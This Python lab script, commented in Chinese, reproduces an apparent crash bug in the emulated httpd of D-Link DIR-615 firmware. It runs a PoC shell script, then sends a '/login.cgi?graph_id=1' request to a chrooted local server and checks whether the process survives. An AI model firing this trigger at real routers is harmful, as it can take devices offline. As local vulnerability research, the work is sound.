"""阶段 2/3：三对照 + 手工单发。

踩过的坑：`pkill -9 -f 'sbin/httpd'` 会匹配到**自己这层 shell 的命令行**
（因为脚本正文里就写着 sbin/httpd），把自己杀掉 —— 表现是 rc=137、输出戛然而止。
所以这里分成两次调用，并且清理只用 `pkill -x httpd`（按进程名精确匹配）。

    py -3 lab/walk2_probe.py
"""

import sys

import vm

ROOT = "/home/ubuntu/lab/d615/root"
REPO = "/home/ubuntu/fwmap-run"

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

MANUAL = f"""
set -u
pkill -9 -x httpd 2>/dev/null; sleep 0.5
( chroot {ROOT} /sbin/httpd -h /www -p 80 >/tmp/httpd2.log 2>&1 & )
for i in 1 2 3 4 5 6 7 8 9 10; do
  (echo > /dev/tcp/127.0.0.1/80) >/dev/null 2>&1 && break
  sleep 0.3
done
python3 - <<'PY'
import socket

def req(path):
    s = socket.create_connection(("127.0.0.1", 80), 5)
    s.sendall(("GET %s HTTP/1.0\\r\\nHost: 127.0.0.1\\r\\n\\r\\n" % path).encode())
    d = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            d += c
    except OSError:
        pass
    s.close()
    first = d.split(b"\\r\\n")[0].decode("latin-1") if d else "(空)"
    print(f"  GET {{path:32s}} -> {{len(d):5d}} 字节  {{first}}")

req("/login.cgi?graph_id=1")
req("/login.cgi")
PY
sleep 1
echo "  进程状态：$(pgrep -x httpd >/dev/null && echo up || echo down)"
echo
echo "########## 服务端日志 ##########"
tail -4 /tmp/httpd2.log 2>/dev/null || echo "(没有日志)"
pkill -9 -x httpd 2>/dev/null
exit 0
"""


def main() -> int:
    print("########## 一键脚本（三对照 + 3 次触发） ##########")
    _rc, out, _err = vm.run(
        f"cd /tmp && bash {REPO}/tools/poc-dir615-login-cgi.sh {ROOT} 2>&1",
        timeout=600, sudo=True)
    sys.stdout.write(out)

    print("\n########## 手工单发 ##########")
    _rc2, out2, err2 = vm.run(MANUAL, timeout=600, sudo=True)
    sys.stdout.write(out2)
    if err2.strip():
        sys.stderr.write("\n--- stderr ---\n" + err2[-400:])
    return 0


if __name__ == "__main__":
    sys.exit(main())
